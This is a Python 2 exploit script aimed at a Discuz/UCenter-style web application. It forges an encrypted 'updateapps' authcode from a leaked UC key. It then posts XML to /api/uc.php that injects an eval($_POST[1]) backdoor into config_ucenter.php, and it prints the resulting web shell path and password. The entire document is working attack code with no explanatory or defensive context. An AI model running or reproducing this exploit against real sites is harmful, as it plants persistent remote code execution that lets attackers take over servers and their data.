#! /usr/bin/env python
#coding=utf-8
import hashlib
import time
import math
import base64
import urllib
import urllib2
import sys
 
def microtime(get_as_float = False) :
    if get_as_float:
        return time.time()
    else:
        return '%.8f %d' % math.modf(time.time())
 
def get_authcode(string, key = ''):
    ckey_length = 4
    key = hashlib.md5(key).hexdigest()
    keya = hashlib.md5(key[0:16]).hexdigest()
    keyb = hashlib.md5(key[16:32]).hexdigest()
    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
    #keyc = (hashlib.md5('0.736000 1389448306').hexdigest())[-ckey_length:]
    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
 
    key_length = len(cryptkey)
    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
    string_length = len(string)
    result = ''
    box = range(0, 256)
    rndkey = dict()
    for i in range(0,256):
        rndkey[i] = ord(cryptkey[i % key_length])
    j=0
    for i in range(0,256):
        j = (j + box[i] + rndkey[i]) % 256
        tmp = box[i]
        box[i] = box[j]
        box[j] = tmp
    a=0
    j=0
    for i in range(0,string_length):
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        tmp = box[a]
        box[a] = box[j]
        box[j] = tmp
        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
    return keyc + base64.b64encode(result).replace('=', '')
 
def get_shell(url,key,host):
    '''
    发送命令获取webshell
    '''
    headers={'Accept-Language':'zh-cn',
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
    'Referer':url
    }
    tm = time.time()+10*3600
    tm="time=%d&action=updateapps" %tm
    code = urllib.quote(get_authcode(tm,key))
    url=url+"?code="+code
    data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://xxx\');eval($_POST[1]);//</item>
            </root>'''
    try:
        req=urllib2.Request(url,data=data1,headers=headers)
        ret=urllib2.urlopen(req)
    except:
        return "访问出错"
    data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://aaa</item>
            </root>'''
    try:
        req=urllib2.Request(url,data=data2,headers=headers)
        ret=urllib2.urlopen(req)
    except:
        return "error"
    return "webshell:"+host+"/config/config_ucenter.php,password:1"
 
if __name__ == '__main__':
    host=sys.argv[1]
    key=sys.argv[2]
    url=host+"/api/uc.php"
    print get_shell(url,key,host)